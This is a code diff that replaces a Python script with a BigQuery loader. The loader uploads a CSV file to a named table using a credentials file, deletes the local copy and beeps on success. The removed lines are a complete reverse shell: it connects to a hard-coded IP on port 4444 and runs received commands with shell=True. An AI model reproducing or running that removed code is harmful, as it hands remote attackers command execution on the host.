@@ -1,41 +1,68 @@
-import socket
-import subprocess
+'''
+Make sure the following is installed:
+pip install google-cloud-bigquery
+pip install --upgrade google-api-python-client
+'''
 
-# LISTENER_IP = "127.0.0.1"
-LISTENER_IP = "172.20.3.89"
-LISTENER_PORT = 4444
+import os
+import winsound
+import sys
+from google.cloud import bigquery
+def read_csv_file(filename):
 
-def create_shell():
-    try:
-        # Create a TCP socket
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        # Connect to the listener at the specified IP and port
-        s.connect((LISTENER_IP, LISTENER_PORT))
+            try:
+                print(f"Read file: {filename}")
+                with open(global_filepath+filename, "rb") as source_file:
+                    job = client.load_table_from_file(
+                        source_file, 
+                        table_id, 
+                        job_config=job_config
+                    )
+                job.result()  # Waits for the job to complete.
+                # Delete file
+                if os.path.exists(global_filepath+filename):
+                   os.remove(global_filepath+filename)
+                   print(f"File '{global_filepath+filename}' deleted successfully.")
+                return 0
+            except Exception as e:
+                print(f"Error reading file {filename}: {e}")
+                return 1
 
-        while True:
-            # Receive command from the listener
-            command = s.recv(1024).decode("utf-8")
-            if command.strip().lower() == "exit":
-                break
 
-            # Execute the received command
-            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+if len(sys.argv) == 3:  
+   global_filepath = sys.argv[1]
+   filename = sys.argv[2]
+   print(f"The first argument is: {global_filepath}")
+   print(f"The second argument is: {filename}")
+else:
+   print(f"Failure 1\n")	
+   os._exit(0)
+current_directory = os.getcwd()
+print(current_directory)
+# Set credentials
+api_key = global_filepath+"YourJsonFile.json"
+os.environ["GOOGLE_APPLICATION_CREDENTIALS"] = api_key
 
-            # Read both stdout and stderr
-            output = process.stdout.read() + process.stderr.read()
+# Construct a BigQuery client object.
+client = bigquery.Client()
 
-            # Send the result back to the listener
-            if output:
-                s.send(output)
-            else:
-                s.send(b"[No output]\n")
 
-    except Exception as e:
-        # Send error message if any exception occurs
-        s.send(f"[Error]: {e}\n".encode())
-    finally:
-        # Close the socket connection
-        s.close()
+# Set table_id to the ID of the table.
+table_id = "scs-lg-solvit.SBS_Data.FirstRun"
 
-if __name__ == "__main__":
-    create_shell()
+
+job_config = bigquery.LoadJobConfig(
+    source_format=bigquery.SourceFormat.CSV,
+    autodetect=True,
+    skip_leading_rows=1,
+    write_disposition=bigquery.WriteDisposition.WRITE_APPEND,   #add this line to append rows vice creating a new table or overwriting data
+
+)
+result=read_csv_file(filename)
+if result == 0:
+  print(f"Success\n")
+  frequency = 2500  # Set Frequency (Hz)
+  duration = 1000 # Set Duration (ms)
+  winsound.Beep(frequency, duration)
+else:
+  print(f"Failure 2\n")
